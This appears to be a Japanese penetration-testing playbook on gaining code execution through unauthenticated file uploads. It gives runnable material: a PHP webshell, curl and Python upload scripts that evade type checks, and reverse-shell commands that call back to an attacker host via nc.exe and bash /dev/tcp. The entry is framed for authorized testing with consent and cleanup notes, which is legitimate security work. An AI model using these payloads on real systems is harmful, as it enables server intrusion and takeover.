# 未認証ファイルアップロードによる RCE

## 着火条件

- Webアプリにファイルアップロード機能がある
- **認証チェックがサーバー側で行われていない**（セッション不要でアップロードエンドポイントに直接 POST できる）
- アップロードしたファイルにWebからアクセスできる（アップロードディレクトリが公開されている）
- サーバーがスクリプト言語（PHP・ASP.NET・JSP 等）を実行できる

> **着火シグナル：** アプリ名とバージョンが判明した時点で searchsploit に「unauthenticated file upload」ヒットがあれば即検討。
> ソースコードが入手できる場合は `upload.php` 等のアップロードハンドラを直接読んで認証チェックの有無を確認する。

## 環境前提

- 実行環境: テスター端末
- 必要なツール: `curl`（ペネトレ用Linuxディストリ標準）/ Python3（標準搭載）
- オフライン代替: `curl` は全環境で使用可。Python の `requests` ライブラリが必要な場合は `pip install requests --break-system-packages`

## 観点・着眼点

**先に確認すること：**
1. アップロードエンドポイントのURL（例: `/upload.php`・`/api/upload`）を特定する
2. アップロードしたファイルが保存・公開されるパスを特定する（例: `/upload/`・`/files/`）
3. サーバーがどのスクリプト言語を実行するか確認する（レスポンスヘッダー・nmap バナー）

**なぜ未認証で刺さるのか：**
アップロード処理ファイルでセッション確認を行い忘れているか、
`id` のような GET パラメータを認証トークン代わりに使っているが実際は検証していないケース。
ソースを読むとわかる場合は `$_SESSION` の確認・`isset()` チェックの欠落を探す。

**バイパス手法（どれが通るかは環境依存）：**

| バイパス手法 | 概要 | 使う場面 |
|------------|------|---------|
| 二重拡張子（double extension） | `shell.php.png` として送信 → サーバーが `.php` として実行 | ファイル名の末尾拡張子のみチェックしているとき |
| マジックバイト前置 | PNGのマジックバイト（`\x89\x50\x4e\x47\x0d\x0a\x1a\x0a`）をファイル先頭に追加 | Content-Type または先頭バイトでファイル種別を判定しているとき |
| Content-Type 偽装 | `Content-Type: image/png` を指定しながら PHP コードを送信 | MIME タイプのみチェックしているとき |
| 拡張子リスト外のスクリプト拡張子 | `.php5`・`.phtml`・`.asp`・`.aspx` 等を試す | 特定の拡張子のみブラックリストで弾いているとき |

## 手順

**事前準備（必須）：**

- アップロードファイルの保存先URLを確認する（ソースコード・ディレクトリ列挙・レスポンス本文から特定）
- テスター端末でリバースシェルのリスナーを先に起動しておく（Webシェル経由でリバースシェルを実行する場合）

```bash
# [Attacker] リスナー起動（別ターミナル）
nc -lnvp 4444
```

**Step 1: Webシェルペイロードを作成する**

```bash
# [Attacker] PHP Webシェル（コマンド実行）
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell.php
```

**Step 2: バイパスを組み合わせてアップロードする（curl の場合）**

```bash
# [Attacker] 二重拡張子 + Content-Type 偽装
curl -s -X POST "http://[TARGET]/upload.php?id=test" \
  -F "file=@shell.php;filename=shell.php.png;type=image/png" \
  -F "pupload=upload"
```

**Step 2（代替）: Python で PNG マジックバイトを前置してアップロード**

```python
# [Attacker] ファイル: upload_shell.py
import requests

url = "http://[TARGET]/upload.php?id=test"
s = requests.Session()
s.get(url, verify=False)

# PNG マジックバイト（8バイト）をシェルコードの前に追加
PNG_magic = b'\x89\x50\x4e\x47\x0d\x0a\x1a\x0a'
payload_code = b'<?php echo shell_exec($_GET["cmd"]); ?>'

png = {
    'file': (
        'test.php.png',              # ファイル名（二重拡張子）
        PNG_magic + b'\n' + payload_code,
        'image/png',                 # Content-Type 偽装
        {'Content-Disposition': 'form-data'}
    )
}
data = {'pupload': 'upload'}
r = s.post(url=url, files=png, data=data, verify=False)
print(r.status_code, r.text[:200])
```

```bash
# [Attacker] 実行
python3 upload_shell.py
```

**Step 3: Webシェルの動作確認**

```bash
# [Attacker] アップロード先のパス + ファイル名でアクセス（idパラメータがファイル名になる場合）
curl "http://[TARGET]/upload/test.php?cmd=whoami"
# → [HOSTNAME]\[USER] のような出力が返れば Webシェル動作確認完了
```

**Step 4: リバースシェルに昇格**

ターゲットが Windows の場合：

```bash
# [Attacker] nc64.exe 等のリバースシェルバイナリを HTTP サーバーで配信
wget https://github.com/[ソース]/nc64.exe   # または手元に用意
python3 -m http.server 80
# テスター側の到達可能インターフェース（環境による: ip a で確認）のIPを使う
```

```bash
# [Attacker] Webシェル経由で PowerShell IWR を使いターゲットにダウンロードさせる
# URL エンコードが必要（ブラウザで開く場合は不要）
curl "http://[TARGET]/upload/test.php?cmd=powershell+Invoke-WebRequest+-Uri+http://[ATTACKER_IP]/nc64.exe+-OutFile+c:\users\public\nc.exe"

# リバースシェルを実行
curl "http://[TARGET]/upload/test.php?cmd=c:\users\public\nc.exe+[ATTACKER_IP]+4444+-e+cmd.exe"
```

ターゲットが Linux の場合：

```bash
# [Attacker] bash リバースシェルを URL エンコードして実行
curl "http://[TARGET]/upload/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/[ATTACKER_IP]/4444+0>%261'"
```

## PoC の信頼性確認と事前検証

searchsploit が「unauthenticated file upload」と説明している場合、その記述を信頼して試すのが基本姿勢。
ただし以下の方法で事前に根拠を確認しておくと、試行の精度が上がる。

**PoC 説明文から読み取れる情報：**

```bash
# [Attacker] PoC の詳細を確認（コードを作業フォルダにコピーする前に読む）
searchsploit -x [PATH_FROM_RESULTS]
```

確認すべき点：
- 「Unauthenticated」の根拠：「No authentication required」「does not check session」等の記述があるか
- 対象バージョン：特定のマイナーバージョンのみ対象の場合があるため、自分のターゲットと一致しているか
- 前提条件：ファイルアップロードが有効になっていることが前提になっていないか

**アプリのソースコードが入手できる場合（任意）：**

攻撃対象のアプリ（オープンソース・公開リポジトリ）のソースが手に入る場合、
アップロードハンドラを読んで認証チェックの欠落を確認できる。

```bash
# [Attacker] 公開されているソースを取得
wget [公開リポジトリのURL]
unzip [zip_file]
```

**アップロードハンドラで確認すべき観点：**

| 確認する観点 | セキュアな実装 | 脆弱な実装（着火条件） |
|------------|-------------|-------------------|
| セッション確認 | `session_start(); if (!isset($_SESSION['user'])) { die(); }` | セッション確認なし |
| ファイルタイプ確認 | `$allowedTypes = ['image/jpeg', 'image/png']; if (!in_array($type, $allowedTypes)) { die(); }` | MIME タイプをクライアント入力のまま信用 |
| 拡張子確認 | ホワイトリスト + 末尾拡張子のみ | ブラックリストのみ、または末尾以外の拡張子を見ない |
| 保存先 | Web 非公開ディレクトリ + ランダムファイル名 | `upload/` 等の公開パス + 元ファイル名そのまま |

**ソースを読まなくても試せる順序：**
1. searchsploit の PoC をそのまま実行 → 動けばそれで十分
2. 動かない場合 → PoC の説明文を読んで前提条件を確認
3. ソースが入手できる場合は上の表で認証チェックの欠落を探す

## 刺さらなかったとき

| 症状 | 原因の推定 | 次のアクション |
|------|----------|--------------|
| アップロードは成功するがスクリプトとして実行されない | アップロードディレクトリがスクリプト実行を禁止している（`.htaccess` / IIS の設定） | 別のアップロードディレクトリを探す / `.htaccess` 自体をアップロードして上書きを試みる |
| 403 / 401 が返る | 認証チェックが存在する | 認証済みセッションのクッキーをヘッダーに付けて再送 |
| 拡張子が弾かれる（エラーメッセージあり） | ホワイトリスト制御 | 別のスクリプト拡張子（`.php5`・`.phtml`・`.asp`）を試す |
| ファイルが上書きされ内容が変わる | ファイル名の重複・sanitization | `id` パラメータを変えてユニークなファイル名を生成する |
| アップロード後のパスが不明 | 保存先が非公開ディレクトリ | レスポンス本文・ソースコード・ディレクトリ列挙でパスを確認 |

## 注意点・落とし穴

- **ファイルの残存（原状回復）：** アップロードした Webシェルはテスト完了後に削除する。
  確認方法: `curl "http://[TARGET]/upload/"` でファイル一覧を確認 → 手動削除または DELETE リクエスト。
- PHP の `shell_exec` が無効になっている場合は `system()`・`passthru()`・`exec()` を代替として試す
- `curl` の `-F` でファイル名にスペースや特殊文字が含まれる場合はクォートで括る
- Content-Type の偽装だけでは通らない場合はマジックバイトの前置を組み合わせる

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 不可逆な変更を含む（アップロードファイルが残存する）
> - [ ] 業務停止リスク（サービス・認証）
> - [ ] 持続化に該当
> - [ ] SIEM/EDR で確実に検知される
> 実施可否は事前合意で明示確認すること。

## 本番での前提

- **事前合意の要否**: ★★（ファイルアップロード機能の悪用は事前合意で範囲明示が必要）
- **業務影響リスク**: アップロードディレクトリへの書き込み（本来のファイルに影響なし・サーバー負荷は軽微）
- **原状回復必須項目**: ✅ アップロードしたシェルファイルを削除する
- **演習環境での扱い**: 制約なし

## 関連技術

- 前：Webアプリのフレームワーク・アプリ名の特定 → `../../01_Reconnaissance/Web_Enumeration.md`
- 前：searchsploit で「unauthenticated file upload」を確認 → `../../05_Tools_Reference/Searchsploit.md`
- 後：Webシェルからリバースシェルへの昇格 → `./Command_Injection.md`（リバースシェル配信セクション）
- 後：Windowsで初期シェル取得後の列挙 → `../../04_Post_Access_Windows_AD/Enumeration_Checklist.md`
